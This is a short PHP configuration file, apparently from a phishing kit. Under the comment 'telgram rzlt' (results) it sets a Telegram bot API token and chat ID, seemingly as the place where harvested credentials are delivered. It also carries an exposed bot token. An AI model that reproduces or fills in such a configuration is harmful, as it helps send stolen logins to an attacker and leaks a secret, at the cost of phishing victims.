<?php


$email =""; 

//telgram rzlt
$api = "6356335515:AAGNgDd55dFdJB8jE5wxClwlkusfBnk81-Y";
$chatid = "-984810892";


?>